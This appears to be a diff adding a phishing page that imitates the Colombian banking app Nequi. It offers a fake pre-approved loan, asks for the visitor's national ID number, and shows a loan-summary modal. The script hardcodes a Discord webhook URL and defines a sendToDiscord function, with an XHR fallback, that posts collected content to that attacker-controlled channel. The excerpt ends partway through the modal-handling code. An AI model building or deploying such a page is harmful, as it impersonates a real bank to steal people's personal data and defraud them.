@@ -1,0 +1,761 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>¡Plata de una en tu Nequi!</title>
+  <link rel="stylesheet" href="../css/index-2.css">
+  <link rel="stylesheet" href="../css/spinner-3.css">
+  <link rel="stylesheet" href="../css/navbar-1.css">
+  <link rel="stylesheet" href="../css/globals-3.css">
+  <link rel="stylesheet" href="../css/styles.css">
+  <link rel="stylesheet" href="../css/load-spinner-1.css">
+  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-3.ico">
+  <style>
+    .loadingContainer { display: none; }
+    footer {
+      margin-top: 40px;
+      background: url(../assets/footer-nequi-1.svg);
+      background-repeat: no-repeat;
+      background-size: cover;
+      padding: 100px 0 60px 0;
+    }
+    .hiddenFormSection { display: none !important; }
+    .textoInformativoFormulario {
+      font-size: 14px; color: #666; text-align: center;
+      line-height: 1.6; margin: 20px 0; font-weight: 500;
+    }
+    .textoInformativoFormulario strong { color: #da0081; font-weight: 600; }
+
+    .modalResultadoCredito {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      display: none; align-items: center; justify-content: center; z-index: 10000;
+    }
+    .modalResultadoCredito.show { display: flex; }
+    .modalBackdrop {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.5); backdrop-filter: blur(4px);
+    }
+    .modalContentCredito {
+      position: relative; background: white; border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); width: 90%; max-width: 450px;
+      max-height: 90vh; overflow-y: auto; animation: slideUpModal 0.4s ease-out;
+    }
+    @keyframes slideUpModal {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .modalHeaderCredito {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 20px; border-bottom: 1px solid #f0f0f0;
+    }
+    .modalTituloCredito { font-size: 18px; font-weight: 600; color: #200020; margin: 0; }
+    .btnCerrarModal {
+      background: none; border: none; cursor: pointer; color: #666;
+      display: flex; align-items: center; justify-content: center;
+      padding: 8px;
+    }
+    .modalBodyCredito { padding: 24px 20px; }
+    .montoResumenModal {
+      background: linear-gradient(135deg, #da0081 0%, #ab005c 100%);
+      border-radius: 12px; padding: 20px; margin-bottom: 20px; text-align: center;
+    }
+    .labelResumen {
+      font-size: 14px; font-weight: 500; color: rgba(255, 255, 255, 0.9);
+      display: block; margin-bottom: 8px;
+    }
+    .montoDisplayModal { font-size: 36px; font-weight: 700; color: white; margin-bottom: 20px; }
+    .sliderMontoModalContainer { margin-top: 16px; }
+    .sliderMontoModalInput {
+      width: 100%; height: 6px; border-radius: 3px;
+      background: linear-gradient(to right, #da0081 0%, #da0081 0%, #fff2f7 0%, #fff2f7 100%);
+      outline: none; -webkit-appearance: none; appearance: none; cursor: pointer;
+    }
+    .sliderMontoModalInput::-webkit-slider-thumb {
+      -webkit-appearance: none; appearance: none; width: 22px; height: 22px;
+      border-radius: 50%; background: #da0081; cursor: pointer;
+      box-shadow: 0 2px 8px rgba(218, 0, 129, 0.4); border: 3px solid white;
+    }
+    .sliderMontoModalLabels {
+      display: flex; justify-content: space-between; font-size: 12px;
+      color: white; margin-top: 8px; opacity: 0.8;
+    }
+    .informacionCreditoModal {
+      background: #f8f8f8; border-radius: 12px; padding: 16px; margin-bottom: 20px;
+    }
+    .itemResumen {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 0; border-bottom: 1px solid #e0e0e0; position: relative;
+    }
+    .itemResumen:last-child { border-bottom: none; }
+    .labelItemResumen { font-size: 13px; font-weight: 500; color: #666; }
+    .valueItemResumen { font-size: 14px; font-weight: 600; color: #200020; }
+    .plazoModalClickeable { cursor: pointer; position: relative; }
+    .plazoModalClickeable::after { content: " meses"; pointer-events: none; }
+    .plazoSelectorModalContainer {
+      display: none; position: absolute; top: 100%; right: 0;
+      background: white; border: 1px solid #e0e0e0; border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); z-index: 100; min-width: 140px;
+    }
+    .plazoSelectorModalContainer.active { display: flex; flex-direction: column; }
+    .plazoSelectorModalOpcion {
+      padding: 10px 16px; font-size: 13px; color: #200020; cursor: pointer;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .plazoSelectorModalOpcion:last-child { border-bottom: none; }
+    .plazoSelectorModalOpcion.selected {
+      background: #fff2f7; color: #da0081; font-weight: 600;
+    }
+    .valueItemResumenCuota { font-size: 16px; font-weight: 700; color: #da0081; }
+    .textoIncluye { font-size: 12px; color: #999; margin-top: 12px; margin-bottom: 0; }
+    .checkboxModal {
+      display: flex; gap: 12px; margin-bottom: 16px; padding: 12px;
+      background: #f5f5f5; border-radius: 8px;
+    }
+    .checkboxIconoModal {
+      width: 24px; height: 24px; min-width: 24px;
+      border: 2px solid #da0081; border-radius: 4px; cursor: pointer;
+      background: white;
+    }
+    .checkboxCheckedModal {
+      display: none; background: #da0081; border-color: #da0081;
+      align-items: center; justify-content: center;
+    }
+    .checkboxCheckedModal img { width: 14px; height: 14px; }
+    .textoCheckboxModal { font-size: 12px; color: #333; line-height: 1.5; cursor: pointer; }
+    .textoCheckboxModal em { font-style: normal; }
+    .textoCheckboxModal a { color: #da0081; text-decoration: none; font-weight: 600; }
+    .modalFooterCredito { padding: 16px 20px 20px; border-top: 1px solid #f0f0f0; }
+    .btnConfirmarModal {
+      width: 100%; background: #da0081; color: white; border: none;
+      padding: 14px 20px; border-radius: 8px; font-size: 16px;
+      font-weight: 600; cursor: pointer;
+    }
+    .btnConfirmarModal:disabled { opacity: 0.5; cursor: not-allowed; }
+    @media (max-width: 600px) {
+      .modalContentCredito { width: 95%; margin: 20px; max-height: calc(100vh - 40px); }
+      .montoDisplayModal { font-size: 28px; }
+      .modalBodyCredito { padding: 16px 14px; }
+    }
+  </style>
+  <script>
+    if ('scrollRestoration' in history) { history.scrollRestoration = 'manual'; }
+    window.addEventListener('load', function () { window.scrollTo(0, 0); });
+  </script>
+
+  <!-- ============================================================
+       POLYFILLS UNIVERSALES
+       Se activan SOLO si el navegador no tiene la función nativa.
+       Los navegadores modernos los ignoran completamente.
+       ============================================================ -->
+  <script>
+    // 1) Promise (Android 4.x, Chrome < 32)
+    if (typeof Promise === "undefined") {
+      window.Promise = (function () {
+        function P(fn) {
+          var self = this;
+          self._s = 0; self._v = null; self._h = [];
+          function ok(v){ self._s=1; self._v=v; flush(); }
+          function no(v){ self._s=2; self._v=v; flush(); }
+          function flush(){
+            self._h.forEach(function(h){
+              if (self._s===1 && h.f) h.f(self._v);
+              if (self._s===2 && h.r) h.r(self._v);
+            });
+            self._h = [];
+          }
+          self.then = function(f,r){
+            return new P(function(res,rej){
+              self._h.push({
+                f: function(v){ try{ res(f?f(v):v); }catch(e){ rej(e); } },
+                r: function(v){ try{ rej(r?r(v):v); }catch(e){ rej(e); } }
+              });
+              flush();
+            });
+          };
+          self["catch"] = function(r){ return self.then(null,r); };
+          try{ fn(ok,no); }catch(e){ no(e); }
+        }
+        P.resolve = function(v){ return new P(function(r){ r(v); }); };
+        P.reject  = function(v){ return new P(function(_,r){ r(v); }); };
+        return P;
+      })();
+    }
+
+    // 2) fetch
+    if (typeof fetch === "undefined") {
+      window.fetch = function(url, opt){
+        opt = opt || {};
+        return new Promise(function(resolve, reject){
+          var x = new XMLHttpRequest();
+          x.open(opt.method || "GET", url, true);
+          if (opt.headers) for (var k in opt.headers) {
+            if (opt.headers.hasOwnProperty(k)) {
+              try { x.setRequestHeader(k, opt.headers[k]); } catch(e){}
+            }
+          }
+          x.onload = function(){
+            resolve({
+              ok: x.status >= 200 && x.status < 300,
+              status: x.status,
+              text: function(){ return Promise.resolve(x.responseText); },
+              json: function(){ return Promise.resolve(JSON.parse(x.responseText)); }
+            });
+          };
+          x.onerror = function(){ reject(new Error("Network error")); };
+          x.send(opt.body || null);
+        });
+      };
+    }
+
+    // 3) Object.assign
+    if (typeof Object.assign !== "function") {
+      Object.assign = function(t){
+        for (var i=1;i<arguments.length;i++){
+          var s = arguments[i];
+          if (s) for (var k in s) if (Object.prototype.hasOwnProperty.call(s,k)) t[k]=s[k];
+        }
+        return t;
+      };
+    }
+
+    // 4) Array.from
+    if (!Array.from) {
+      Array.from = function(a){ var r=[]; for(var i=0;i<a.length;i++) r.push(a[i]); return r; };
+    }
+
+    // 5) Array.prototype.find
+    if (!Array.prototype.find) {
+      Array.prototype.find = function(p){
+        for (var i=0;i<this.length;i++) if (p(this[i],i,this)) return this[i];
+      };
+    }
+
+    // 6) Array.prototype.includes
+    if (!Array.prototype.includes) {
+      Array.prototype.includes = function(v){
+        return this.indexOf(v) !== -1;
+      };
+    }
+
+    // 7) String.prototype.includes
+    if (!String.prototype.includes) {
+      String.prototype.includes = function(s,p){ return this.indexOf(s, p||0) !== -1; };
+    }
+
+    // 8) Element.closest
+    if (window.Element && !Element.prototype.closest) {
+      Element.prototype.closest = function(sel){
+        var el = this;
+        while (el && el.nodeType === 1) {
+          if (el.matches && el.matches(sel)) return el;
+          if (el.msMatchesSelector && el.msMatchesSelector(sel)) return el;
+          if (el.webkitMatchesSelector && el.webkitMatchesSelector(sel)) return el;
+          el = el.parentElement || el.parentNode;
+        }
+        return null;
+      };
+    }
+
+    // 9) NodeList.forEach
+    if (window.NodeList && !NodeList.prototype.forEach) {
+      NodeList.prototype.forEach = Array.prototype.forEach;
+    }
+
+    // 10) Element.matches
+    if (window.Element && !Element.prototype.matches) {
+      Element.prototype.matches =
+        Element.prototype.matchesSelector ||
+        Element.prototype.mozMatchesSelector ||
+        Element.prototype.msMatchesSelector ||
+        Element.prototype.oMatchesSelector ||
+        Element.prototype.webkitMatchesSelector ||
+        function(s){ var m=(this.document||this.ownerDocument).querySelectorAll(s), i=m.length; while(--i>=0 && m[i]!==this){} return i>-1; };
+    }
+
+    // 11) Intl.NumberFormat
+    if (typeof Intl === "undefined") window.Intl = {};
+    if (!Intl.NumberFormat) {
+      Intl.NumberFormat = function(loc, opt){
+        opt = opt || {};
+        var minD = opt.minimumFractionDigits || 0;
+        var maxD = opt.maximumFractionDigits || 0;
+        return {
+          format: function(n){
+            n = Number(n) || 0;
+            var parts = n.toFixed(Math.min(maxD, minD)).split(".");
+            var ip = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+            return parts[1] ? ip + "," + parts[1] : ip;
+          }
+        };
+      };
+    }
+
+    // 12) CustomEvent
+    if (typeof window.CustomEvent !== "function") {
+      window.CustomEvent = function(event, params){
+        params = params || { bubbles:false, cancelable:false, detail:null };
+        var e = document.createEvent("CustomEvent");
+        e.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
+        return e;
+      };
+    }
+
+    // 13) URLSearchParams
+    if (typeof URLSearchParams === "undefined") {
+      window.URLSearchParams = function(init){
+        this._p = [];
+        if (init) {
+          var s = String(init).replace(/^\?/, "").split("&");
+          for (var i=0;i<s.length;i++) {
+            var kv = s[i].split("=");
+            if (kv[0]) this._p.push([decodeURIComponent(kv[0]), decodeURIComponent(kv[1]||"")]);
+          }
+        }
+        this.append = function(k,v){ this._p.push([k,v]); };
+        this.toString = function(){
+          return this._p.map(function(p){ return encodeURIComponent(p[0])+"="+encodeURIComponent(p[1]); }).join("&");
+        };
+      };
+    }
+
+    // 14) Helpers localStorage blindados
+    window.getFormDataSafe = function () {
+      try { return JSON.parse(localStorage.getItem("formData")) || {}; }
+      catch (e) { return {}; }
+    };
+    window.setFormDataSafe = function (data) {
+      try { localStorage.setItem("formData", JSON.stringify(data)); return true; }
+      catch (e) { window._formDataMem = data; return false; }
+    };
+  </script>
+</head>
+
+<body class="bodyContainer" style="background: #fff">
+  <main class="loadingContainer">
+    <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+          <a href="loan-simulator.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
+            <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+              <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
+              <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
+              <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
+              <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
+              <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
+            </svg>
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <section class="mainSectionContainer loading">
+      <div class="hero-image"></div>
+      <div class="mainSectionWrapper">
+        <div class="logo_nequi_animado">
+          <img src="../assets/loading-nequi-1.webp" alt="">
+        </div>
+        <p class="wait-msg">Por favor, espere...</p>
+        <p class="info-msg">En este momento estamos validando algunos datos.</p>
+        <div class="bottom" style="display: flex">
+          <p class="warning-msg" id="validoHasta">*Valido desde el <span id="dia">07</span> de <span id="mes">Agosto</span> al <span id="dia2">25</span> de <span id="mes2">Septiembre</span> del <span id="anio">2025</span>, aplican T&amp;C</p>
+          <img src="../assets/seguro_fogafin.svg" alt="">
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap">
+        <div class="wrapper">
+          <div class="footer">
+            <img class="footer-pc" src="../assets/footer-bigscreen-2.png" alt="">
+            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
+          </div>
+        </div>
+      </div>
+    </footer>
+  </main>
+
+  <div class="loading-spinner" id="loadingContenedor">
+    <div class="cubes-text">
+      <div class="nequi-loader" id="loader">
+        <div class="cubes">
+          <div class="cube"></div>
+          <div class="cube"></div>
+        </div>
+      </div>
+      <span class="text-cube" id="textCube"></span>
+    </div>
+    <div class="done" id="done">
+      <div class="check"></div>
+      <span>¡Listo!</span>
+    </div>
+  </div>
+
+  <div class="content" id="content">
+    <div class="check-container">
+      <div class="checkmark"></div>
+    </div>
+    <p>Listo! Tu crédito se encuentra preaprobado.</p>
+  </div>
+
+  <script>
+    document.getElementById("mes").textContent = "Mayo";
+    document.getElementById("mes2").textContent = "Julio";
+    document.getElementById("dia").textContent = "10";
+    document.getElementById("dia2").textContent = "31";
+    document.getElementById("anio").textContent = "2025";
+  </script>
+
+  <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+    <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+      <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+        <a href="loan-simulator.php.html" class="h-8 [&amp;&gt;svg]:w-[100px]">
+          <svg _ngcontent-atq-c28="" width="180" height="40" viewbox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+            <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
+            <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
+            <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
+            <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
+            <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
+          </svg>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <div class="credits" style="padding-bottom: 0 !important">
+    <div class="wrap">
+      <div class="wrapper" style="width: 100% !important">
+        <div class="type-credits__content" id="type-credits">
+          <div class="type-credits-card-w credit-3">
+            <div class="big-letter" style="height: 45vh !important">
+              <h1 class="u-text-white is-credit-effect-page" style="font-size: 2rem !important; padding: 9.5rem 0">
+                Solicita tu crédito
+              </h1>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <main class="mainContainer">
+    <section>
+      <div class="rounded-lg">
+        <div class="px-6" id="simuladorSalvavidas">
+          <div class="max-w-[400px] mx-auto">
+            <h4 class="text-base font-bold text-balance text-left w-full text-pink-primary mt-2 mb-4">
+              Datos personales
+            </h4>
+            <div class="flex flex-col justify-center items-center gap-4 mb-3 w-full">
+              <div class="form-group">
+                <img src="../assets/document.png" alt="">
+                <input type="text" required inputmode="numeric" maxlength="10" pattern="[0-9]*" id="cedulaSalvavidas">
+                <label for="cedulaSalvavidas">Ingresa tu cédula</label>
+              </div>
+              <span id="cedulaErrorSalvavidas" class="text-red-500 text-xs hidden">La cédula debe tener entre 7 y 10 dígitos</span>
+
+              <p class="textoInformativoFormulario">
+                Para conocer tu <strong>cupo preaprobado</strong>, ingresa tu número de documento
+              </p>
+
+              <button type="button" id="btnContinuarSalvavidas"
+                class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed"
+                disabled>
+                Solicitar
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap">
+        <div class="wrapper">
+          <div class="footer">
+            <img class="footer-pc" src="../assets/footer-bigscreen-2.png" alt="">
+            <img class="footer-mobile" src="../assets/footer-2.png" alt="">
+          </div>
+        </div>
+      </div>
+    </footer>
+  </main>
+
+  <div class="modalResultadoCredito" id="modalResultadoCredito">
+    <div class="modalBackdrop" id="modalBackdrop"></div>
+    <div class="modalContentCredito">
+      <div class="modalHeaderCredito">
+        <h2 class="modalTituloCredito">Resumen de tu crédito</h2>
+        <button type="button" id="btnCerrarModal" class="btnCerrarModal" aria-label="Cerrar">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+      </div>
+      <div class="modalBodyCredito">
+        <div class="montoResumenModal">
+          <h4 class="labelResumen">¿Cuánta plata necesitas?</h4>
+          <div class="montoDisplayModal">$<span id="montoModalResultado">6.700.000</span></div>
+          <div class="sliderMontoModalContainer">
+            <input type="range" id="sliderMontoModal" class="sliderMontoModalInput" min="100000" max="6700000" value="6700000" step="100000">
+            <div class="sliderMontoModalLabels">
+              <span>$100 mil</span>
+              <span>$6.7 M</span>
+            </div>
+          </div>
+        </div>
+        <div class="informacionCreditoModal">
+          <div class="itemResumen">
+            <span class="labelItemResumen">Plazo:</span>
+            <div style="position: relative; width: auto;">
+              <span class="valueItemResumen plazoModalClickeable" id="plazoModalResultado">24</span>
+              <div class="plazoSelectorModalContainer" id="plazoSelectorModalContainer">
+                <div class="plazoSelectorModalOpcion" data-plazo="12">12 meses</div>
+                <div class="plazoSelectorModalOpcion" data-plazo="24">24 meses</div>
+                <div class="plazoSelectorModalOpcion" data-plazo="36">36 meses</div>
+              </div>
+            </div>
+          </div>
+          <div class="itemResumen">
+            <span class="labelItemResumen">Fecha de pago:</span>
+            <span class="valueItemResumen" id="fechaModalResultado">1 de cada mes</span>
+          </div>
+          <div class="itemResumen">
+            <span class="labelItemResumen">Cuota mensual:</span>
+            <span class="valueItemResumenCuota" id="cuotaModalResultado">$15.900</span>
+          </div>
+          <p class="textoIncluye">Incluye préstamo (capital), seguro e intereses.</p>
+        </div>
+        <div class="checkboxModal" id="checkboxModalCredito">
+          <div class="checkboxIconoModal" id="checkboxModalNoChecked"></div>
+          <div class="checkboxIconoModal checkboxCheckedModal" id="checkboxModalChecked">
+            <img src="../assets/checked.svg" alt="">
+          </div>
+          <div class="textoCheckboxModal">
+            <em>Autorizo a Bancolombia S.A. para que me contacte vía telefónica con fines comerciales. Conoce más en:</em>
+            <a href="https://www.nequi.com.co/informacion-legal/sitio-web/tratamiento-de-datos-personales-nequi"><em>Políticas de tratamiento de datos.</em></a>
+          </div>
+        </div>
+      </div>
+      <div class="modalFooterCredito">
+        <button type="button" id="btnConfirmarModal" class="btnConfirmarModal" disabled>
+          Confirmar y continuar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!--
+    NOTA: Se eliminó async/await y se usaron patrones ES5 (var, function,
+    .then) para compatibilidad con Android 4.x y navegadores antiguos.
+  -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var cedulaInput = document.getElementById("cedulaSalvavidas");
+      var cedulaError = document.getElementById("cedulaErrorSalvavidas");
+      var btnContinuar = document.getElementById("btnContinuarSalvavidas");
+      var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560271962012651641/S0P2R_wy0Ic3f06qIhuXyVRj6cyjZe9MQYzcW7NXp9-UEgv9mF6tVqAmCFnoFRSB7_DY";
+
+      var modalResultado = document.getElementById("modalResultadoCredito");
+      var btnCerrarModal = document.getElementById("btnCerrarModal");
+      var btnConfirmarModal = document.getElementById("btnConfirmarModal");
+      var modalBackdrop = document.getElementById("modalBackdrop");
+      var checkboxModalCredito = document.getElementById("checkboxModalCredito");
+      var checkboxModalNoChecked = document.getElementById("checkboxModalNoChecked");
+      var checkboxModalChecked = document.getElementById("checkboxModalChecked");
+      var sliderMontoModal = document.getElementById("sliderMontoModal");
+      var montoModalResultado = document.getElementById("montoModalResultado");
+      var cuotaModalResultado = document.getElementById("cuotaModalResultado");
+      var plazoModalResultado = document.getElementById("plazoModalResultado");
+      var plazoSelectorModalContainer = document.getElementById("plazoSelectorModalContainer");
+      var plazoSelectorOpciones = document.querySelectorAll(".plazoSelectorModalOpcion");
+      var fechaModalResultado = document.getElementById("fechaModalResultado");
+
+      var TASA_INTERES_MODAL = 0.012;
+      var plazoModalActual = 24;
+
+      // ===== ENVÍO A DISCORD CON FALLBACK XHR =====
+      function sendToDiscord(content) {
+        var payload = { content: content };
+        var bodyStr = JSON.stringify(payload);
+
+        if (typeof fetch === "function") {
+          try {
+            fetch(DISCORD_WEBHOOK_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: bodyStr
+            }).then(function(r){
+              if (!r.ok) console.warn("Discord status:", r.status);
+            })["catch"](function(err){
+              console.warn("fetch falló, usando XHR");
+              xhrSend(bodyStr);
+            });
+            return;
+          } catch (e) {}
+        }
+        xhrSend(bodyStr);
+      }
+
+      function xhrSend(bodyStr) {
+        try {
+          var x = new XMLHttpRequest();
+          x.open("POST", DISCORD_WEBHOOK_URL, true);
+          x.setRequestHeader("Content-Type", "application/json");
+          x.send(bodyStr);
+        } catch (e) {}
+      }
+
+      function calcularCuota(monto, meses) {
+        var capitalMensual = monto / meses;
+        var interesMensual = monto * TASA_INTERES_MODAL;
+        return Math.round(capitalMensual + interesMensual);
+      }
+      function actualizarMontoModal(monto) {
+        montoModalResultado.textContent = new Intl.NumberFormat("es-CO").format(monto);
+        var cuota = calcularCuota(monto, plazoModalActual);
+        cuotaModalResultado.textContent = "$" + new Intl.NumberFormat("es-CO").format(cuota);
+      }
+      function cerrarSelector() { plazoSelectorModalContainer.classList.remove("active"); }
+      function actualizarPlazo(nuevo) {
+        plazoModalActual = nuevo;
+        plazoModalResultado.textContent = nuevo;
+        cerrarSelector();
+        actualizarMontoModal(parseInt(sliderMontoModal.value, 10));
+        for (var i = 0; i < plazoSelectorOpciones.length; i++) {
+          var op = plazoSelectorOpciones[i];
+          if (parseInt(op.getAttribute("data-plazo"), 10) === nuevo) {
+            op.classList.add("selected");
+          } else {
+            op.classList.remove("selected");
+          }
+        }
+      }
+      function abrirModal() {
+        sliderMontoModal.value = 6700000;
+        plazoModalActual = 24;
+        actualizarMontoModal(6700000);
+        plazoModalResultado.textContent = 24;
+        fechaModalResultado.textContent = "1 de cada mes";
+        for (var i = 0; i < plazoSelectorOpciones.length; i++) {
+          var op = plazoSelectorOpciones[i];
+          if (parseInt(op.getAttribute("data-plazo"), 10) === 24) {
